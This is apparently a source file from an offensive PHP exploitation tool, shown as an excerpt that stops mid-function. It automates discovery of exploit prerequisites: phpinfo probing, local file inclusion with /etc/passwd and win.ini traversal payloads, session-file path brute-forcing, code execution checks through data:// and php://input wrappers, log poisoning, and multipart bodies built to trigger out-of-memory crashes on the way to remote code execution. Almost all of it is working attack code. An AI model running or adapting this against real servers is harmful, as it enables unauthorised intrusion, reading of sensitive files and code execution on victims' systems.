"""Auto-discovery: phpinfo, LFI paths, session paths, PHP wrappers.

Used by the ``auto`` mode to find exploit prerequisites before running
chains.  All requests are recorded as evidence in the RunStore so the
operator can audit exactly what was sent.

Discovery is bounded by a shared budget and stops early when the
prerequisites for at least one chain are satisfied.
"""

from __future__ import annotations

import re
import socket
import time
from base64 import b64decode
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, quote, urljoin, urlsplit

from .classifier import classify
from .http import HttpClient, HttpExchange
from .models import TargetProfile
from .util import new_nonce, utcnow

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

PHPINFO_PATHS: List[str] = [
    "/phpinfo.php", "/info.php", "/php_info.php", "/test.php",
    "/i.php", "/pi.php", "/pinfo.php", "/_phpinfo.php",
    "/debug.php", "/test/phpinfo.php", "/php/info.php",
    "/admin/phpinfo.php", "/status.php",
]

LFI_PARAMS: List[str] = [
    "file", "page", "inc", "include", "path", "template",
    "lang", "doc", "view", "content", "load", "read",
    "f", "p", "module", "action", "url", "src", "name",
]

LFI_PAGES: List[str] = [
    "", "index.php", "page.php", "view.php", "include.php",
    "load.php", "content.php", "template.php", "file.php",
    "show.php", "display.php", "vuln.php", "test.php",
    "download.php", "read.php", "get.php", "open.php",
    "render.php", "main.php", "home.php",
]

SESSION_PATHS: List[str] = [
    "/tmp/sess_",
    "/tmp/sessions/sess_",
    "/var/lib/php/sessions/sess_",
    "/var/lib/php/session/sess_",
    "/var/lib/php5/sessions/sess_",
    "/var/lib/php7/sessions/sess_",
    "/var/lib/php8/sessions/sess_",
    "/var/tmp/sess_",
    "/dev/shm/sess_",
]

TRAVERSAL_DEPTHS = [
    "../../../../",
    "../../../../../",
    "../../../../../../",
    "../../../../../../../",
    "../../../../../../../../",
]

LOG_PATHS: List[str] = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/proc/self/fd/2",
    "/tmp/php_errors.log",
    "/var/log/php-fpm.log",
    "/var/log/php_errors.log",
]

_PHPINFO_DETECT = re.compile(
    r"<title>phpinfo\(\)</title>|PHP Version \d|phpinfo\(\)", re.I
)
_PHPINFO_DIRECTIVE = re.compile(
    r"<tr>\s*<td[^>]*>\s*([^<]+?)\s*</td>\s*<td[^>]*>\s*([^<]+?)\s*</td>",
    re.DOTALL,
)
_PASSWD_DETECT = re.compile(r"root:[x*]:0:0:")
_WININI_DETECT = re.compile(r"\[(fonts|extensions)\]", re.I)
_HREF_RE = re.compile(r'href=["\']([^"\']{1,500})["\']', re.I)
_ACTION_RE = re.compile(r'action=["\']([^"\']{1,500})["\']', re.I)
_SRC_RE = re.compile(r'src=["\']([^"\']{1,500})["\']', re.I)

# Framework detection patterns
_FRAMEWORK_SIGNATURES: List[Tuple[str, str, str]] = [
    ("laravel_session", "cookie", "Laravel"),
    ("XSRF-TOKEN", "cookie", "Laravel"),
    ("X-Powered-By: Laravel", "header", "Laravel"),
    ("symfony", "cookie", "Symfony"),
    ("_sf2", "cookie", "Symfony"),
    ("wp-content", "body", "WordPress"),
    ("wp-includes", "body", "WordPress"),
    ("Drupal", "header", "Drupal"),
    ("X-Generator: Drupal", "header", "Drupal"),
    ("ci_session", "cookie", "CodeIgniter"),
    ("CAKEPHP", "cookie", "CakePHP"),
    ("yii", "cookie", "Yii"),
]


# ---------------------------------------------------------------------------
# Result dataclasses
# ---------------------------------------------------------------------------


@dataclass
class PhpInfoResult:
    found: bool = False
    url: Optional[str] = None
    session_save_path: Optional[str] = None
    memory_limit: Optional[str] = None
    disable_functions: List[str] = field(default_factory=list)
    open_basedir: Optional[str] = None
    allow_url_include: Optional[bool] = None
    allow_url_fopen: Optional[bool] = None
    php_version: Optional[str] = None
    sapi: Optional[str] = None
    document_root: Optional[str] = None
    upload_progress_enabled: Optional[bool] = None
    upload_progress_cleanup: Optional[bool] = None
    raw_directives: Dict[str, str] = field(default_factory=dict)
    evidence_refs: List[str] = field(default_factory=list)

    def memory_limit_bytes(self) -> Optional[int]:
        """Parse memory_limit into bytes.  Returns None if unknown."""
        if not self.memory_limit:
            return None
        val = self.memory_limit.strip()
        if val == "-1":
            return -1
        m = re.match(r"^(\d+)\s*([KMG]?)$", val, re.I)
        if not m:
            return None
        n = int(m.group(1))
        suffix = m.group(2).upper()
        if suffix == "K":
            return n * 1024
        if suffix == "M":
            return n * 1024 * 1024
        if suffix == "G":
            return n * 1024 * 1024 * 1024
        return n

    def to_dict(self) -> Dict[str, Any]:
        return {
            "found": self.found,
            "url": self.url,
            "session_save_path": self.session_save_path,
            "memory_limit": self.memory_limit,
            "memory_limit_bytes": self.memory_limit_bytes(),
            "disable_functions": list(self.disable_functions),
            "open_basedir": self.open_basedir,
            "allow_url_include": self.allow_url_include,
            "allow_url_fopen": self.allow_url_fopen,
            "php_version": self.php_version,
            "sapi": self.sapi,
            "upload_progress_enabled": self.upload_progress_enabled,
            "upload_progress_cleanup": self.upload_progress_cleanup,
            "evidence_refs": list(self.evidence_refs),
        }


@dataclass
class LfiEndpoint:
    url: str
    param: str
    method: str = "traversal"
    traversal_depth: str = "../../../../"
    evidence_ref: Optional[str] = None

    def build_include_url(self, file_path: str) -> str:
        parsed = urlsplit(self.url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if self.method == "traversal":
            payload = self.traversal_depth + file_path.lstrip("/")
        elif self.method == "direct":
            payload = file_path
        elif self.method == "php_input":
            payload = "php://input"
        elif self.method == "data":
            payload = file_path
        else:
            payload = file_path
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[self.param] = [payload]
        from urllib.parse import quote as _q
        query = "&".join(
            f"{_q(k, safe='')}={_q(v[0], safe='')}" for k, v in qs.items()
        )
        return f"{base}?{query}"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "param": self.param,
            "method": self.method,
            "traversal_depth": self.traversal_depth,
            "evidence_ref": self.evidence_ref,
        }


@dataclass
class DiscoverResult:
    phpinfo: PhpInfoResult = field(default_factory=PhpInfoResult)
    lfi_endpoints: List[LfiEndpoint] = field(default_factory=list)
    session_path: Optional[str] = None
    session_path_source: Optional[str] = None
    allow_url_include: Optional[bool] = None
    wrapper_works: Optional[str] = None
    framework: Optional[str] = None
    framework_version: Optional[str] = None
    log_poisoning_path: Optional[str] = None
    log_poisoning_log: Optional[str] = None
    oom_vulnerable: bool = False
    oom_status_code: Optional[int] = None
    oom_body_snippet: Optional[str] = None
    oom_sapi_is_mod_php: Optional[bool] = None
    discovered_pages: List[str] = field(default_factory=list)
    discovered_params: Dict[str, List[str]] = field(default_factory=dict)
    crawled_pages: List[str] = field(default_factory=list)
    evidence_refs: List[str] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)
    requests_used: int = 0

    @property
    def has_lfi(self) -> bool:
        return len(self.lfi_endpoints) > 0

    @property
    def chain_a_ready(self) -> bool:
        return self.has_lfi and self.session_path is not None

    @property
    def chain_c_ready(self) -> bool:
        return self.has_lfi and self.session_path is not None

    @property
    def wrapper_ready(self) -> bool:
        return self.wrapper_works is not None

    @property
    def log_poison_ready(self) -> bool:
        return self.has_lfi and self.log_poisoning_path is not None

    @property
    def chain_d_ready(self) -> bool:
        return self.oom_vulnerable and self.oom_sapi_is_mod_php is True

    def best_lfi(self) -> Optional[LfiEndpoint]:
        if not self.lfi_endpoints:
            return None
        for ep in self.lfi_endpoints:
            if ep.method in ("data", "php_input"):
                return ep
        return self.lfi_endpoints[0]

    def to_dict(self) -> Dict[str, Any]:
        return {
            "phpinfo": self.phpinfo.to_dict(),
            "lfi_endpoints": [ep.to_dict() for ep in self.lfi_endpoints],
            "session_path": self.session_path,
            "session_path_source": self.session_path_source,
            "allow_url_include": self.allow_url_include,
            "wrapper_works": self.wrapper_works,
            "framework": self.framework,
            "log_poisoning_path": self.log_poisoning_path,
            "log_poisoning_log": self.log_poisoning_log,
            "oom_vulnerable": self.oom_vulnerable,
            "oom_status_code": self.oom_status_code,
            "oom_sapi_is_mod_php": self.oom_sapi_is_mod_php,
            "discovered_pages": list(self.discovered_pages),
            "crawled_pages": list(self.crawled_pages),
            "notes": list(self.notes),
            "errors": list(self.errors),
            "requests_used": self.requests_used,
        }


# ---------------------------------------------------------------------------
# Budget helper
# ---------------------------------------------------------------------------


class DiscoverBudget:
    def __init__(self, max_requests: int = 200) -> None:
        self.max_requests = max_requests
        self.used = 0

    def can_spend(self, n: int = 1) -> bool:
        return self.used + n <= self.max_requests

    def spend(self) -> None:
        self.used += 1

    @property
    def remaining(self) -> int:
        return max(0, self.max_requests - self.used)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _safe_get(
    client: HttpClient,
    url: str,
    store: Any,
    budget: DiscoverBudget,
    scenario_id: str,
    timeout: float = 8.0,
    notes: str = "",
    extra_headers: Optional[Dict[str, str]] = None,
) -> Optional[Tuple[HttpExchange, Any]]:
    if not budget.can_spend():
        return None
    nonce = new_nonce("P2SDISC")
    headers: Dict[str, str] = {"Accept": "text/html", "User-Agent": "Mozilla/5.0"}
    if extra_headers:
        headers.update(extra_headers)
    try:
        exchange = client.request(
            "GET", url, headers=headers, nonce=nonce, timeout=timeout,
        )
    except Exception as exc:
        budget.spend()
        return None
    budget.spend()
    classification = classify(exchange, nonce=nonce)
    item = store.add_http(
        exchange, classification,
        scenario_id=scenario_id,
        trust="medium",
        notes=notes or scenario_id,
    )
    return exchange, item


def _safe_post(
    client: HttpClient,
    url: str,
    body: bytes,
    content_type: str,
    store: Any,
    budget: DiscoverBudget,
    scenario_id: str,
    timeout: float = 8.0,
    notes: str = "",
    cookie: Optional[str] = None,
) -> Optional[Tuple[HttpExchange, Any]]:
    if not budget.can_spend():
        return None
    nonce = new_nonce("P2SDISC")
    headers: Dict[str, str] = {"Content-Type": content_type}
    if cookie:
        headers["Cookie"] = cookie
    try:
        exchange = client.request(
            "POST", url, body=body, headers=headers, nonce=nonce, timeout=timeout,
        )
    except Exception:
        budget.spend()
        return None
    budget.spend()
    classification = classify(exchange, nonce=nonce)
    item = store.add_http(
        exchange, classification,
        scenario_id=scenario_id,
        trust="medium",
        notes=notes or scenario_id,
    )
    return exchange, item


def _request_path(base_url: str, path: str) -> str:
    parsed = urlsplit(base_url)
    base_path = parsed.path.rstrip("/")
    if not path.startswith("/"):
        path = "/" + path
    if base_path and path.startswith(base_path):
        return path
    return base_path + path


def _full_url(base_url: str, path: str) -> str:
    parsed = urlsplit(base_url)
    resolved = _request_path(base_url, path)
    return f"{parsed.scheme}://{parsed.netloc}{resolved}"


def _body_text(exchange: HttpExchange) -> str:
    return getattr(exchange, "body_preview", "") or ""


# ---------------------------------------------------------------------------
# Phase 1: phpinfo discovery
# ---------------------------------------------------------------------------


def _parse_phpinfo(html: str) -> Dict[str, str]:
    directives: Dict[str, str] = {}
    for match in _PHPINFO_DIRECTIVE.finditer(html):
        name = match.group(1).strip()
        value = match.group(2).strip()
        if value and value != "<i>no value</i>":
            directives[name] = value
    return directives


def discover_phpinfo(
    client: HttpClient,
    profile: TargetProfile,
    store: Any,
    budget: DiscoverBudget,
    timeout: float = 8.0,
) -> PhpInfoResult:
    result = PhpInfoResult()

    for path in PHPINFO_PATHS:
        url = _full_url(profile.base_url, path)
        pair = _safe_get(
            client, url, store, budget,
            scenario_id="discover-phpinfo",
            timeout=timeout,
            notes=f"phpinfo probe: {path}",
        )
        if pair is None:
            continue
        exchange, item = pair
        result.evidence_refs.append(item.id)
        body = _body_text(exchange)

        if not _PHPINFO_DETECT.search(body):
            continue

        result.found = True
        result.url = url
        directives = _parse_phpinfo(body)
        result.raw_directives = directives

        result.session_save_path = directives.get("session.save_path")
        result.memory_limit = directives.get("memory_limit")
        result.open_basedir = directives.get("open_basedir")
        result.document_root = directives.get("DOCUMENT_ROOT")

        df = directives.get("disable_functions", "")
        if df and df != "no value":
            result.disable_functions = [
                f.strip() for f in df.split(",") if f.strip()
            ]

        aui = directives.get("allow_url_include", "").lower()
        result.allow_url_include = aui in ("on", "1")

        auf = directives.get("allow_url_fopen", "").lower()
        result.allow_url_fopen = auf in ("on", "1")

        upe = directives.get("session.upload_progress.enabled", "").lower()
        if upe:
            result.upload_progress_enabled = upe in ("on", "1")
        upc = directives.get("session.upload_progress.cleanup", "").lower()
        if upc:
            result.upload_progress_cleanup = upc in ("on", "1")

        version_match = re.search(r"PHP Version\s+(\d+\.\d+\.\d+\S*)", body)
        if version_match:
            result.php_version = version_match.group(1)

        sapi_match = re.search(r"Server API\s*</td>\s*<td[^>]*>\s*([^<]+)", body)
        if sapi_match:
            result.sapi = sapi_match.group(1).strip()

        break

    return result


# ---------------------------------------------------------------------------
# Phase 2: link extraction from homepage
# ---------------------------------------------------------------------------


def _extract_links(base_url: str, html: str) -> List[Tuple[str, Dict[str, str]]]:
    """Extract local links with query parameters from HTML."""
    results: List[Tuple[str, Dict[str, str]]] = []
    seen: Set[str] = set()

    for match in _HREF_RE.finditer(html):
        href = match.group(1)
        if href.startswith(("http://", "https://", "//", "mailto:", "javascript:", "#")):
            parsed_href = urlsplit(href)
            parsed_base = urlsplit(base_url)
            if parsed_href.netloc and parsed_href.netloc != parsed_base.netloc:
                continue
            if not parsed_href.query:
                continue
            path = parsed_href.path
        elif "?" not in href:
            continue
        else:
            path = href.split("?")[0]

        if "?" not in href:
            continue
        query_str = href.split("?", 1)[1]
        params = parse_qs(query_str, keep_blank_values=True)
        flat_params = {k: v[0] if v else "" for k, v in params.items()}

        key = f"{path}|{'|'.join(sorted(flat_params.keys()))}"
        if key in seen:
            continue
        seen.add(key)
        results.append((path, flat_params))

    return results


# ---------------------------------------------------------------------------
# Phase 3: LFI discovery
# ---------------------------------------------------------------------------


def _is_lfi_hit(baseline_body: str, test_body: str, os_type: str = "linux") -> bool:
    if os_type == "linux":
        return bool(
            _PASSWD_DETECT.search(test_body) and not _PASSWD_DETECT.search(baseline_body)
        )
    elif os_type == "windows":
        return bool(
            _WININI_DETECT.search(test_body) and not _WININI_DETECT.search(baseline_body)
        )
    return False


def _test_lfi_on_url(
    client: HttpClient,
    base_url: str,
    page_path: str,
    param: str,
    store: Any,
    budget: DiscoverBudget,
    baseline_body: str,
    timeout: float = 8.0,
) -> Optional[LfiEndpoint]:
    parsed = urlsplit(base_url)
    full_path = _request_path(base_url, page_path) if page_path else parsed.path

    # Try direct absolute paths first (faster, works on many real LFI endpoints)
    for os_type, canary, detect in [
        ("linux", "/etc/passwd", _PASSWD_DETECT),
        ("windows", "C:\\Windows\\win.ini", _WININI_DETECT),
    ]:
        test_url = f"{parsed.scheme}://{parsed.netloc}{full_path}?{param}={quote(canary, safe='')}"
        pair = _safe_get(
            client, test_url, store, budget,
            scenario_id="discover-lfi",
            timeout=timeout,
            notes=f"LFI test (direct): {page_path or '/'} ?{param}={canary}",
        )
        if pair is None:
            return None
        exchange, item = pair
        body = _body_text(exchange)
        if detect.search(body) and not detect.search(baseline_body):
            return LfiEndpoint(
                url=f"{parsed.scheme}://{parsed.netloc}{full_path}",
                param=param,
                method="direct",
                traversal_depth="",
                evidence_ref=item.id,
            )

    # Then try path traversal at various depths
    for depth in TRAVERSAL_DEPTHS:
        for os_type, canary, detect in [
            ("linux", "etc/passwd", _PASSWD_DETECT),
            ("windows", "Windows/win.ini", _WININI_DETECT),
        ]:
            payload = depth + canary
            test_url = f"{parsed.scheme}://{parsed.netloc}{full_path}?{param}={quote(payload, safe='')}"

            pair = _safe_get(
                client, test_url, store, budget,
                scenario_id="discover-lfi",
                timeout=timeout,
                notes=f"LFI test: {page_path or '/'} ?{param}={depth}{canary}",
            )
            if pair is None:
                return None
            exchange, item = pair
            body = _body_text(exchange)

            if detect.search(body) and not detect.search(baseline_body):
                return LfiEndpoint(
                    url=f"{parsed.scheme}://{parsed.netloc}{full_path}",
                    param=param,
                    method="traversal",
                    traversal_depth=depth,
                    evidence_ref=item.id,
                )

        if not budget.can_spend(2):
            return None

    return None


def _test_wrapper_on_url(
    client: HttpClient,
    base_url: str,
    page_path: str,
    param: str,
    store: Any,
    budget: DiscoverBudget,
    timeout: float = 8.0,
) -> Optional[LfiEndpoint]:
    """Test php://filter wrapper — works even with open_basedir."""
    parsed = urlsplit(base_url)
    full_path = _request_path(base_url, page_path) if page_path else parsed.path

    payload = "php://filter/convert.base64-encode/resource=index"
    test_url = f"{parsed.scheme}://{parsed.netloc}{full_path}?{param}={quote(payload, safe='')}"
    pair = _safe_get(
        client, test_url, store, budget,
        scenario_id="discover-lfi-wrapper",
        timeout=timeout,
        notes=f"php://filter test: {page_path or '/'} ?{param}",
    )
    if pair is None:
        return None
    exchange, item = pair
    body = _body_text(exchange).strip()

    if len(body) > 20:
        clean = re.sub(r"\s+", "", body)
        if re.fullmatch(r"[A-Za-z0-9+/=]+", clean[:500]):
            try:
                decoded = b64decode(clean[:2000])
                if b"<?php" in decoded or b"<?=" in decoded:
                    return LfiEndpoint(
                        url=f"{parsed.scheme}://{parsed.netloc}{full_path}",
                        param=param,
                        method="php_filter",
                        evidence_ref=item.id,
                    )
            except Exception:
                pass

    return None


def _quick_lfi_test(
    client: HttpClient,
    base_url: str,
    page_path: str,
    param: str,
    store: Any,
    budget: DiscoverBudget,
    baseline_body: str,
    timeout: float = 8.0,
) -> Optional[LfiEndpoint]:
    """Fast LFI test: only direct absolute paths (2 requests max)."""
    parsed = urlsplit(base_url)
    full_path = _request_path(base_url, page_path) if page_path else parsed.path

    for canary, detect, method_label in [
        ("/etc/passwd", _PASSWD_DETECT, "direct"),
        ("C:\\Windows\\win.ini", _WININI_DETECT, "direct"),
    ]:
        test_url = f"{parsed.scheme}://{parsed.netloc}{full_path}?{param}={quote(canary, safe='')}"
        pair = _safe_get(
            client, test_url, store, budget,
            scenario_id="discover-lfi",
            timeout=timeout,
            notes=f"LFI quick: {page_path or '/'} ?{param}={canary}",
        )
        if pair is None:
            return None
        exchange, item = pair
        body = _body_text(exchange)
        if detect.search(body) and not detect.search(baseline_body):
            return LfiEndpoint(
                url=f"{parsed.scheme}://{parsed.netloc}{full_path}",
                param=param,
                method="direct",
                traversal_depth="",
                evidence_ref=item.id,
            )
    return None


def discover_lfi(
    client: HttpClient,
    profile: TargetProfile,
    store: Any,
    budget: DiscoverBudget,
    homepage_body: str = "",
    timeout: float = 8.0,
    max_lfi_requests: int = 100,
) -> List[LfiEndpoint]:
    endpoints: List[LfiEndpoint] = []
    baseline_body = homepage_body

    if not baseline_body:
        pair = _safe_get(
            client, profile.base_url, store, budget,
            scenario_id="discover-lfi-baseline",
            timeout=timeout,
            notes="LFI baseline",
        )
        if pair:
            baseline_body = _body_text(pair[0])

    pages_to_test: List[Tuple[str, List[str]]] = []

    discovered = _extract_links(profile.base_url, baseline_body)
    for path, params in discovered:
        pages_to_test.append((path, list(params.keys())))

    for page in LFI_PAGES:
        if not any(p == page for p, _ in pages_to_test):
            pages_to_test.append((page, list(LFI_PARAMS)))

    # Phase A: quick scan — direct absolute paths only (2 requests per page×param).
    # Test the top 3 most likely params per page first.
    TOP_PARAMS = ["file", "page", "inc", "include", "path", "f"]
    start_used = budget.used

    for page_path, params_to_try in pages_to_test:
        if endpoints or not budget.can_spend(2):
            break
        quick_params = [p for p in TOP_PARAMS if p in params_to_try]
        quick_params += [p for p in params_to_try if p not in TOP_PARAMS]
        for param in quick_params[:4]:
            if not budget.can_spend(2):
                break
            ep = _quick_lfi_test(
                client, profile.base_url, page_path, param,
                store, budget, baseline_body, timeout,
            )
            if ep is not None:
                endpoints.append(ep)
                break
        if endpoints:
            break

    if endpoints:
        return endpoints

    # Phase B: deeper scan — traversal on pages that exist (got non-error response).
    # Only if budget allows and quick scan found nothing.
    remaining = max_lfi_requests - (budget.used - start_used)
    if remaining < 4:
        return endpoints

    for page_path, params_to_try in pages_to_test:
        if endpoints or not budget.can_spend(4):
            break
        quick_params = [p for p in TOP_PARAMS if p in params_to_try]
        for param in quick_params[:2]:
            if not budget.can_spend(4):
                break
            ep = _test_lfi_on_url(
                client, profile.base_url, page_path, param,
                store, budget, baseline_body, timeout,
            )
            if ep is not None:
                endpoints.append(ep)
                break

            wp = _test_wrapper_on_url(
                client, profile.base_url, page_path, param,
                store, budget, timeout,
            )
            if wp is not None:
                endpoints.append(wp)
                break
        if endpoints:
            break

    return endpoints


# ---------------------------------------------------------------------------
# Phase 4: session path discovery
# ---------------------------------------------------------------------------


def discover_session_path(
    client: HttpClient,
    profile: TargetProfile,
    store: Any,
    budget: DiscoverBudget,
    phpinfo: PhpInfoResult,
    lfi: Optional[LfiEndpoint],
    timeout: float = 8.0,
) -> Tuple[Optional[str], Optional[str]]:
    if phpinfo.session_save_path:
        path = phpinfo.session_save_path.rstrip("/")
        return f"{path}/sess_", "phpinfo"

    if lfi is None:
        return None, None

    test_sid = "p2sdiscoverytest" + new_nonce("P2S")[-8:]
    parsed = urlsplit(profile.base_url)
    inject_url = profile.base_url

    boundary = f"P2SDISC{test_sid[-8:]}"
    inject_body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"P2SDISCOVERYSESSIONTEST\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="test.bin"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("utf-8")

    _safe_post(
        client, inject_url, inject_body,
        f"multipart/form-data; boundary={boundary}",
        store, budget,
        scenario_id="discover-session-inject",
        timeout=timeout,
        notes="session path discovery: inject test session",
        cookie=f"PHPSESSID={test_sid}",
    )

    for sess_prefix in SESSION_PATHS:
        if not budget.can_spend():
            break

        test_path = sess_prefix + test_sid
        if lfi.method == "traversal":
            payload = lfi.traversal_depth + test_path.lstrip("/")
        else:
            payload = test_path
        test_url = f"{lfi.url}?{lfi.param}={quote(payload, safe='')}"

        pair = _safe_get(
            client, test_url, store, budget,
            scenario_id="discover-session-path",
            timeout=timeout,
            notes=f"session path test: {sess_prefix}",
        )
        if pair is None:
            continue
        exchange, item = pair
        body = _body_text(exchange)

        if "P2SDISCOVERYSESSIONTEST" in body or "upload_progress_" in body:
            return sess_prefix, "lfi_brute"

    return None, None


# ---------------------------------------------------------------------------
# Phase 5: PHP wrapper direct execution test
# ---------------------------------------------------------------------------


def test_php_wrappers(
    client: HttpClient,
    profile: TargetProfile,
    store: Any,
    budget: DiscoverBudget,
    lfi: LfiEndpoint,
    phpinfo: PhpInfoResult,
    timeout: float = 8.0,
) -> Optional[str]:
    """Test if data:// or php://input wrappers execute code via the LFI.

    Returns the wrapper type that works, or None.
    """
    if phpinfo.allow_url_include is False:
        return None

    marker = f"P2SWRAPTEST{new_nonce('P2S')[-8:]}"
    php_code = f"<?php echo '{marker}'; ?>"

    import base64
    b64_payload = base64.b64encode(php_code.encode()).decode()
    data_payload = f"data://text/plain;base64,{b64_payload}"

    parsed = urlsplit(lfi.url)
    test_url = f"{lfi.url}?{lfi.param}={quote(data_payload, safe='')}"

    pair = _safe_get(
        client, test_url, store, budget,
        scenario_id="discover-wrapper-data",
        timeout=timeout,
        notes="data:// wrapper execution test",
    )
    if pair is not None:
        exchange, item = pair
        body = _body_text(exchange)
        if marker in body:
            return "data"

    if not budget.can_spend():
        return None

    input_url = f"{lfi.url}?{lfi.param}={quote('php://input', safe='')}"
    post_body = f"<?php echo '{marker}'; ?>".encode()
    pair = _safe_post(
        client, input_url, post_body, "application/x-www-form-urlencoded",
        store, budget,
        scenario_id="discover-wrapper-input",
        timeout=timeout,
        notes="php://input wrapper execution test",
    )
    if pair is not None:
        exchange, item = pair
        body = _body_text(exchange)
        if marker in body:
            return "php_input"

    return None


# ---------------------------------------------------------------------------
# Phase 5b: log poisoning test
# ---------------------------------------------------------------------------


_LOG_MARKER_RE = re.compile(r"P2SLOGTEST[A-Z0-9]{8}")


def discover_log_poisoning(
    client: HttpClient,
    profile: TargetProfile,
    store: Any,
    budget: DiscoverBudget,
    lfi: LfiEndpoint,
    timeout: float = 8.0,
) -> Tuple[Optional[str], Optional[str]]:
    """Test if any known log file is includable via the LFI.

    Injects a unique marker in the User-Agent header, then reads each
    candidate log path through the LFI.  Returns (log_path, evidence_ref)
    on success.
    """
    marker = f"P2SLOGTEST{new_nonce('P2S')[-8:]}"
    ua_with_marker = f"Mozilla/5.0 {marker}"

    _safe_get(
        client, profile.base_url, store, budget,
        scenario_id="discover-log-poison-inject",
        timeout=timeout,
        notes="log poison: inject marker via User-Agent",
        extra_headers={"User-Agent": ua_with_marker},
    )

    for log_path in LOG_PATHS:
        if not budget.can_spend():
            break
        include_url = lfi.build_include_url(log_path)
        pair = _safe_get(
            client, include_url, store, budget,
            scenario_id="discover-log-poison-read",
            timeout=timeout,
            notes=f"log poison: read {log_path}",
        )
        if pair is None:
            continue
        exchange, item = pair
        body = _body_text(exchange)
        if marker in body:
            return log_path, item.id

    return None, None


# ---------------------------------------------------------------------------
# Phase 5c: basic spider (one level deep)
# ---------------------------------------------------------------------------


def _extract_all_links(base_url: str, html: str) -> List[str]:
    """Extract local PHP links from HTML for crawling."""
    results: List[str] = []
    seen: Set[str] = set()
    parsed_base = urlsplit(base_url)

    for regex in (_HREF_RE, _ACTION_RE, _SRC_RE):
        for match in regex.finditer(html):
            href = match.group(1).strip()
            if href.startswith(("javascript:", "mailto:", "#", "data:")):
                continue

            if href.startswith(("http://", "https://", "//")):
                parsed_href = urlsplit(href)
                if parsed_href.netloc and parsed_href.netloc != parsed_base.netloc:
                    continue
                path = parsed_href.path
            else:
                path = href.split("?")[0].split("#")[0]

            if not path or not path.endswith(".php"):
                continue
            if path in seen:
                continue
            seen.add(path)
            results.append(path)

    return results


def spider_pages(
    client: HttpClient,
    profile: TargetProfile,
    store: Any,
    budget: DiscoverBudget,
    homepage_body: str,
    timeout: float = 8.0,
    max_pages: int = 15,
) -> List[Tuple[str, str]]:
    """Crawl one level deep from the homepage to find PHP pages with params.

    Returns list of (page_path, body) tuples.
    """
    results: List[Tuple[str, str]] = []
    links = _extract_all_links(profile.base_url, homepage_body)

    for link in links[:max_pages]:
        if not budget.can_spend():
            break
        url = _full_url(profile.base_url, link)
        pair = _safe_get(
            client, url, store, budget,
            scenario_id="discover-spider",
            timeout=timeout,
            notes=f"spider: {link}",
        )
        if pair is None:
            continue
        exchange, item = pair
        if exchange.status and 200 <= exchange.status < 400:
            body = _body_text(exchange)
            results.append((link, body))

    return results


# ---------------------------------------------------------------------------
# Phase 7: OOM probe (Chain D prerequisite)
# ---------------------------------------------------------------------------

_OOM_DETECT = re.compile(
    r"Allowed memory size|memory exhausted|Fatal error.*memory", re.I
)


def _nest_name(i: int, depth: int, key_pad: int = 90) -> bytes:
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def build_oom_probe_body(
    parts: int = 1200,
    depth: int = 64,
    big: int = 120,
    big_len: int = 8000,
    burners: int = 40,
    burner_len: int = 8000,
    progress_len: int = 8000,
    boundary: str = "C" * 10,
) -> bytes:
    """Build a multipart body designed to trigger OOM in PHP's session
    upload_progress handler via nested file fields + large values.

    Shape matches the proven A1 configuration from 9bie/php2shell-bypass-aslr-exp.
    """
    b = boundary.encode()
    out = bytearray()

    def part(name: bytes, value: bytes = b"", filename: Optional[bytes] = None,
             ctype: Optional[bytes] = None) -> None:
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n")
        if ctype is not None:
            out.extend(b"Content-Type: " + ctype + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"\x00")
    for i in range(parts):
        is_mixed = i == 0
        is_mixed2 = i == 1
        ctype = b"C" * 103 if is_mixed else (b"C" * 231 if is_mixed2 else b"application/octet-stream")
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" +
                   _nest_name(i, depth) + b"\"")
        if is_mixed or is_mixed2:
            out.extend(b"; filename=\"A\"")
        else:
            out.extend(b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: " + ctype + b"\r\n\r\n")
    for i in range(14):
        part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        part(("b%04d" % i).encode(), b"B" * big_len)
    for i in range(burners):
        part(("u%02d" % i).encode(), b"U" * burner_len)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out.extend(b"--" + b + b"--\r\n")
    return bytes(out)


def build_oom_lite_body(
    parts: int = 600,
    depth: int = 48,
    boundary: str = "C" * 10,
) -> bytes:
    """Lighter OOM probe body — fewer parts, just enough to detect vulnerability
    without necessarily achieving full exploitation."""
    b = boundary.encode()
    out = bytearray()

    def part(name: bytes, value: bytes = b"") -> None:
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
        out.extend(b"; filename=\"\"")
        out.extend(b"\r\nContent-Type: application/octet-stream\r\n\r\n" + value + b"\r\n")

    out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n\x00\r\n")
    for i in range(parts):
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" +
                   _nest_name(i, depth, key_pad=50) + b"\"")
        out.extend(b"; filename=\"\"\r\nContent-Type: application/octet-stream\r\n\r\n")
    for i in range(30):
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"b%04d\"\r\n\r\n" % i)
        out.extend(b"B" * 8000 + b"\r\n")
